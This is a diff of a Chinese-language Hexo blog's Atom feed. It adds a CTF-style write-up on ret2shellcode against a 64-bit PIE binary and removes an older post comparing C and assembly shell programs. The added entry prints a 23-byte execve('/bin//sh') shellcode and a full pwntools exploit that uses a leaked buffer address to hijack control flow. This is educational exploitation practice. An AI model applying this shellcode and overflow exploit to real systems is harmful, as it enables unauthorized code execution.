@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://rj45mp.github.io/"/>
-  <updated>2019-12-03T07:03:22.151Z</updated>
+  <updated>2019-12-04T06:28:59.063Z</updated>
   <id>https://rj45mp.github.io/</id>
   
   <author>
@@ -15,6 +15,28 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>ret2shellcode-习题</title>
+    <link href="https://rj45mp.github.io/ret2shellcode-test/"/>
+    <id>https://rj45mp.github.io/ret2shellcode-test/</id>
+    <published>2019-12-04T00:45:02.000Z</published>
+    <updated>2019-12-04T06:28:59.063Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="binary"><a href="#binary" class="headerlink" title="binary"></a>binary</h2><p><img src="/ret2shellcode-test/image-20191204084810779.png" alt="image-20191204084810779"></p><p>64位的binary，开启Partial RELR0和PIE。</p><h2 id="PIE-ASLR"><a href="#PIE-ASLR" class="headerlink" title="PIE/ASLR"></a>PIE/ASLR</h2><p><strong>1、简介</strong></p><p>PIE(position-independent executables)和ASLR(address space layout randomization),地址空间布局随机化。</p><p><strong>2、原理</strong></p><p>在程序运行加载时，程序和其库文件都会被映射到虚拟地址空间的不同地址，其对应的地址随着每一次执行程序的 变化而变化。<br>通过地址空间随机化机制，阻止黑客在堆栈上执行shellcode。</p><p><strong>3、开关</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1)操作系统地址随机化： </span><br><span class="line">echo 0 /proc/sys/kernel/randomize_va_space  #关闭地址空间随机化保护机制 </span><br><span class="line">echo 1 /proc/sys/kernel/randomize_va_space  #将mmap基地址和stack与vdso页面随机化 </span><br><span class="line">echo 2 /proc/sys/kernel/randomize_va_space  #将mmap基地址、stack与vdso页面和栈地址随机化 </span><br><span class="line"></span><br><span class="line">2）程序地址随机化： </span><br><span class="line">gcc pie.c -o pie    #默认情况下，开启PIE保护机制 </span><br><span class="line">gcc-no-pie pie.c -o pie #关闭PIE保护机制 </span><br><span class="line">gcc -fpie -pie pie.c -o pie #开启低强度PIE保护机制 </span><br><span class="line">gcc -fPIE -pie pie.c -o pie #开启高强度PIE保护机制</span><br></pre></td></tr></table></figure><h2 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h2><p><img src="/ret2shellcode-test/image-20191204090018943.png" alt="image-20191204090018943"></p><p>binary存在溢出，尽管其开启了PIE，可是泄露出来了buf的地址。</p><p><img src="/ret2shellcode-test/image-20191204142028547.png" alt="image-20191204142028547"></p><p>所以利用的思路就是ret2shellcode,往buf中填入shellcode，通过接受泄露出的buf地址，溢出劫持控制流去执行shellcode。</p><h2 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h2><p><strong>1、选择</strong></p><p>由于可填充的空间有限制，<code>0x40=64</code>，而pwntools中的shellcode长度在<code>44</code>,还得考虑填充buf的地址和垃圾数据问题，故选择一段23字节的64位shellcode</p><p><img src="/ret2shellcode-test/image-20191204131232323.png" alt="image-20191204131232323"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shellcode_x64 = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br></pre></td></tr></table></figure><p><strong>2、部署</strong></p><p><img src="/ret2shellcode-test/image-20191204131457251.png" alt="image-20191204131457251"></p><p>为避免shellcode填充进去后，在执行过程中被<code>leave</code>指令破坏，不能将shellcode填充到最前面。</p><p>下面利用gdb进行动态调试解释：</p><h2 id="GDB"><a href="#GDB" class="headerlink" title="GDB"></a>GDB</h2><p><img src="/ret2shellcode-test/image-20191204132050480.png" alt="image-20191204132050480"></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><p><img src="/ret2shellcode-test/image-20191204141725367.png" alt="image-20191204141725367"></p><h2 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">offset = 0x10+8</span><br><span class="line">p = process(&quot;./shellcode&quot;)</span><br><span class="line">shellcode_x64 = &quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05&quot;</span><br><span class="line">p.recvuntil(&apos;[&apos;)</span><br><span class="line">buf_addr = p.recvuntil(&apos;]&apos;, drop=True)</span><br><span class="line">buf_addr = int(buf_addr,16)</span><br><span class="line">payload = &apos;\x90&apos;*offset+p64(buf_addr+offset+8)+shellcode_x64</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><img src="/ret2shellcode-test/image-20191204142604439.png" alt="image-20191204142604439"></p><p>注意：shellcode_addr = buf_addr+offset+len(buf_addr)</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p>github-ctf-wiki</p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h2 id=&quot;binary&quot;&gt;&lt;a href=&quot;#binary&quot; class=&quot;headerlink&quot; title=&quot;binary&quot;&gt;&lt;/a&gt;binary&lt;/h2&gt;&lt;p&gt;&lt;img src=&quot;/ret2shellcode-test/image-20191204084810779.
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
   
   <entry>
     <title>stackoverflow之ret2shellcode</title>
@@ -440,30 +462,6 @@
       
         &lt;h1 id=&quot;背景&quot;&gt;&lt;a href=&quot;#背景&quot; class=&quot;headerlink&quot; title=&quot;背景&quot;&gt;&lt;/a&gt;背景&lt;/h1&gt;&lt;p&gt;1、代码&lt;/p&gt;
 &lt;p&gt;&lt;img src=&quot;/%E5%87%BD%E6%95%B0%E5%9C%A8%E6%A0%88%E4%B8%AD%E
-      
-    
-    </summary>
-    
-    
-    
-  </entry>
-  
-  <entry>
-    <title>同一功能程序在汇编语言和C语言下的不同实现方式</title>
-    <link href="https://rj45mp.github.io/%E5%90%8C%E4%B8%80%E5%8A%9F%E8%83%BD%E7%A8%8B%E5%BA%8F%E5%9C%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%92%8CC%E8%AF%AD%E8%A8%80%E4%B8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/"/>
-    <id>https://rj45mp.github.io/%E5%90%8C%E4%B8%80%E5%8A%9F%E8%83%BD%E7%A8%8B%E5%BA%8F%E5%9C%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%92%8CC%E8%AF%AD%E8%A8%80%E4%B8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/</id>
-    <published>2019-09-29T14:16:26.000Z</published>
-    <updated>2019-09-29T17:39:22.756Z</updated>
-    
-    <content type="html"><![CDATA[<p>同一功能的程序，用汇编语言实现和用C语言实现，两者有什么不同形式？</p><h1 id="程序"><a href="#程序" class="headerlink" title="程序"></a>程序</h1><p>编写一个shell功能程序。</p><h1 id="C语言实现"><a href="#C语言实现" class="headerlink" title="C语言实现"></a>C语言实现</h1><p>代码：</p><p><img src="/%E5%90%8C%E4%B8%80%E5%8A%9F%E8%83%BD%E7%A8%8B%E5%BA%8F%E5%9C%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%92%8CC%E8%AF%AD%E8%A8%80%E4%B8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/1.png" alt></p><p>编译执行：</p><p><img src="/%E5%90%8C%E4%B8%80%E5%8A%9F%E8%83%BD%E7%A8%8B%E5%BA%8F%E5%9C%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%92%8CC%E8%AF%AD%E8%A8%80%E4%B8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/2.png" alt></p><h1 id="汇编语言实现"><a href="#汇编语言实现" class="headerlink" title="汇编语言实现"></a>汇编语言实现</h1><p>代码：</p><p><img src="/%E5%90%8C%E4%B8%80%E5%8A%9F%E8%83%BD%E7%A8%8B%E5%BA%8F%E5%9C%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%92%8CC%E8%AF%AD%E8%A8%80%E4%B8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/3.png" alt></p><p>编译执行：</p><p><img src="/%E5%90%8C%E4%B8%80%E5%8A%9F%E8%83%BD%E7%A8%8B%E5%BA%8F%E5%9C%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%92%8CC%E8%AF%AD%E8%A8%80%E4%B8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/4.png" alt></p><p><img src="/%E5%90%8C%E4%B8%80%E5%8A%9F%E8%83%BD%E7%A8%8B%E5%BA%8F%E5%9C%A8%E6%B1%87%E7%BC%96%E8%AF%AD%E8%A8%80%E5%92%8CC%E8%AF%AD%E8%A8%80%E4%B8%8B%E7%9A%84%E4%B8%8D%E5%90%8C%E5%AE%9E%E7%8E%B0%E6%96%B9%E5%BC%8F/5.png" alt></p><p>注意：该程序涉及到了栈与寄存器传参知识点，后续进行讲解。</p><h1 id="比较"><a href="#比较" class="headerlink" title="比较"></a>比较</h1><p>从实现来看，C语言编写的程序是通过库函数实现shell功能；<br>而对于汇编语言编写的程序，其是通过系统调用来实现shell功能的。</p><h1 id="下期预告"><a href="#下期预告" class="headerlink" title="下期预告"></a>下期预告</h1><p>函数在栈中的调用过程</p>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;p&gt;同一功能的程序，用汇编语言实现和用C语言实现，两者有什么不同形式？&lt;/p&gt;
-&lt;h1 id=&quot;程序&quot;&gt;&lt;a href=&quot;#程序&quot; class=&quot;headerlink&quot; title=&quot;程序&quot;&gt;&lt;/a&gt;程序&lt;/h1&gt;&lt;p&gt;编写一个shell功能程序。&lt;/p&gt;
-&lt;h1 id=&quot;C语
       
     
     </summary>
